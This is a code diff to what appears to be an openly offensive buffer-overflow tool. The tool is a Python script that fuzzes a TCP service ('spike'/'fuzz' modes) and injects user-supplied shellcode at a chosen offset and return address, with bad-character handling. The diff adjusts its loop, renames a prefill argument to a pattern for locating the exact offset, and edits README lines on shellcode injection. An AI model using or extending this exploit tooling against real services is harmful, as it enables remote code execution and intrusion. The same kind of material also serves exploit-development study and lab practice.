@@ -22,7 +22,7 @@ You can do this by going to View -> CPU.
 
 EXAMPLE usage of Shell code injection
 
-offset=2003vul
+offset=2003
 
 vulnerable_address="ABCCDDEE" #pay attention to Endianess - reverse the address value if its little endian
 
@@ -94,7 +94,7 @@ def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step):
     # the smaller the step, the higher is accuracy
     buffer = prefix + prefill
 
-    while (True and (mode != "inject")):
+    while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 
@@ -159,7 +159,8 @@ def main():
                         help='prefix can be used at the beginning of each TCP frame to make correct requests')
     parser.add_argument('-n', '--prefill_num', default=0, type=int,
                         help='Prefill the payload with n bytes after prefix')
-    parser.add_argument('-a', '--prefill_hex', default='', type=str,
+    # Prefill with ascii pattern to find exact offset or insert non byte values
+    parser.add_argument('-a', '--prefill_pattern', default='', type=str,
                         help='Prefill the payload with specific hex symbols')
     parser.add_argument('-b', '--useBadChars', default=0, type=int,
                         help="1: bad character placement; 0: no bad characters")
@@ -177,11 +178,11 @@ def main():
     step = args.step
     prefix = bytearray(args.prefix, encoding='ascii')
     prefill_num = args.prefill_num
-    prefill_hex = bytearray(args.prefill_hex, encoding='ascii')
+    prefill_pattern = bytearray(args.prefill_pattern, encoding='ascii')
     useBadChars = args.useBadChars
     shellcode = bytearray.fromhex(args.ShellCode)
 
-    prefill = b'A' * prefill_num + prefill_hex
+    prefill = b'A' * prefill_num + prefill_pattern
 
     if mode == "spike" or mode == "fuzz":
 
